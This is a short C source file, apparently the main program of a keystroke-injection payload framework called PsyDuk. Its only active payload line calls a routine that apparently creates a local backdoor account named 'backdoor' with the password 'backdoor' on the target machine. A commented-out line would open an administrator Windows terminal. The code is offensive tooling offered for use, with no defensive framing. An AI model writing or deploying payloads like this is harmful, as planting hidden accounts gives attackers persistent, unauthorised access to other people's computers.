/*
 *  PsyDuk.c
 *  
 *
 *  Created by Psychosis on 29/04/10.
 *  Copyright 2010 __MyCompanyName__. All rights reserved.
 *
 */

#include "psyduk/includes.h"
#include "payloads/includes.h"

int main(void)
{
	PDInitialise();

	/*
	 * Payload code starts here
	 */
	//PDOpenWindowsTerminalAsAdministrator();
	WACreateBackdoor_P("backdoor","backdoor", REALM_LOCAL);
}


